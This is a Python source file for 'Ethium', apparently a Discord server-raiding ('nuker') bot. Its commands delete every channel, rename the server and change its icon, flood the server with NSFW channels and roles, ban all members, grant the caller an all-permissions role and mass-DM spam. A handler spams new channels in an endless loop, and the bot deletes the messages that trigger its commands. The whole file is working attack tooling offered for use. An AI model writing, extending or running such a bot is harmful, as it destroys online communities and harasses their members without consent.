import asyncio
import logging as log
import os
import sys
from multiprocessing import Process
from typing import Dict, Optional, Union

import discord
import httpx
from discord.ext import commands as cmds
from rgbprint import Color, gradient_print

TOKEN: str = ''
PREFIX: str = r''
SERVER_NAME: str = ''
ICON_URL: str = ''
CHANNELS_NAME: str = ''
ROLES_NAME: str = ''
SPAM_MSG: str = ''


cls = lambda: os.system('cls || clear')


async def banner() -> None:
    BANNER: str = '''
▄███▄     ▄▄▄▄▀ ▄  █ ▄█   ▄   █▀▄▀█ 
█▀   ▀ ▀▀▀ █   █   █ ██    █  █ █ █ 
██▄▄       █   ██▀▀█ ██ █   █ █ ▄ █ 
█▄   ▄▀   █    █   █ ▐█ █   █ █   █ 
▀███▀    ▀        █   ▐ █▄ ▄█    █  
                 ▀       ▀▀▀    ▀
    '''
    _dev: discord.User = await ethium.fetch_user(843511119033401394)
    cmds = ' ~ '.join([cmd.name for cmd in ethium.commands])
    cls()
    gradient_print(BANNER, start_color=Color.thistle, end_color=Color.white_smoke)
    log.info(f'Logged in as {ethium.user}')
    log.info(f'Commands: {cmds}')
    log.info(f'Prefix: {ethium.command_prefix}')
    log.info(f'Coded by {_dev}\n')


ethium: cmds.Bot = cmds.Bot(
    command_prefix=PREFIX,
    help_command=None,
    intents=discord.Intents.all(),
)


@ethium.event
async def on_ready() -> None:
    ACTIVITY_NAME: str = '#Ethium'
    TWITCH_URL: str = 'https://twitch.tv/S4vitaar'
    activity: discord.Streaming = discord.Streaming(name=ACTIVITY_NAME, url=TWITCH_URL)
    try:
        await ethium.change_presence(activity=activity)
        await banner()

    except Exception as e:
        log.error(f'An error occurred while changing the status {e}')


@ethium.event
async def on_command(ctx: cmds.Context) -> None:
    cmd: Optional[cmds.Command] = ctx.command
    author: Union[discord.User, discord.Member] = ctx.author
    log.info(f'Command {cmd} executed by {author}')
    try:
        await ctx.message.delete()
    except Exception as e:
        log.error(f'An error occurred while deleting the message {e}')


@ethium.event
async def on_command_error(_, exception: Union[cmds.CommandError, Exception]) -> None:
    exception = getattr(exception, 'original', exception)
    log.error(exception)


@ethium.event
async def on_command_completion(ctx: cmds.Context) -> None:
    await banner()


@ethium.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
    if channel.position == 0:
        return

    while True:
        try:
            await channel.send(SPAM_MSG)
            log.info(f'Spammed channel {channel}')

        except Exception as e:
            log.error(f'An error occurred while spamming the message {e}')


@ethium.command()
async def nuke(ctx: cmds.Context) -> None:
    guild: discord.Guild = ctx.guild
    _URL: str = 'https://discord.com/api/v10/channels/%s'
    _HEADERS: Dict[str, str] = {'Authorization': f'Bot {TOKEN}'}

    async def del_channel(channel_id) -> None:
        async with httpx.AsyncClient() as client:
            await client.delete(_URL % channel_id, headers=_HEADERS)

    for channel in guild.channels:
        Process(target=asyncio.run, args=(del_channel(channel.id),)).start()
        log.info(f'Deleted channel {channel}')

    channel: discord.TextChannel = await guild.create_text_channel(CHANNELS_NAME)
    await channel.send(SPAM_MSG)


@ethium.command()
async def raid(ctx: cmds.Context) -> None:
    guild: discord.Guild = ctx.guild
    _response: httpx.Response = httpx.get(ICON_URL)
    guild_icon: bytes = _response.content
    await guild.edit(name=SERVER_NAME, icon=guild_icon)
    for _ in range(50):
        channel: discord.TextChannel = await guild.create_text_channel(
            CHANNELS_NAME, nsfw=True
        )
        log.info(f'Created channel {channel}')


@ethium.command(name='massban')
async def mass_ban(ctx: cmds.Context) -> None:
    guild: discord.Guild = ctx.guild
    for member in [
        member for member in guild.members if not member in (ctx.author, ethium.user)
    ]:
        await guild.ban(member)
        log.info(f'Executed member {member}')


@ethium.command(name='admin')
async def get_admin(ctx: cmds.Context) -> None:
    guild: discord.Guild = ctx.guild
    author: Union[discord.User, discord.Member] = ctx.author
    role: discord.Role = await guild.create_role(
        name=PREFIX, permissions=discord.Permissions().all()
    )
    await author.add_roles(role)
    log.info(f'Role added {role} to {author}')


@ethium.command(name='massdm')
async def mass_dm(ctx: cmds.Context) -> None:
    guild: discord.Guild = ctx.guild
    for member in [
        member for member in guild.members if not member in (ctx.author, ethium.user)
    ]:
        channel: discord.DMChannel = await member.create_dm()
        await channel.send(SPAM_MSG)
        log.info(f'Spammed DM {channel}')


@ethium.command(name='delroles')
async def del_roles(ctx: cmds.Context) -> None:
    guild: discord.Guild = ctx.guild
    for role in [role for role in guild.roles if role.name != 'everyone']:
        await role.delete()
        log.info(f'Deleted role {role}')


@ethium.command(name='createroles')
async def create_roles(ctx: cmds.Context) -> None:
    guild: discord.Guild = ctx.guild
    for _ in range(250 - len(guild.roles)):
        role: discord.Role = await guild.create_role(name=ROLES_NAME)
        log.info(f'Created role {role}')


if __name__ == '__main__':
    log.basicConfig(
        level=log.INFO,
        format=f'{Color.thistle}[%(asctime)s] - {Color.white_smoke}%(message)s',
        datefmt='%I:%M:%S',
    )
    try:
        ethium.run(TOKEN)
    except Exception as e:
        log.error(f'An error occurred while logging into the client {e}')
        sys.exit()
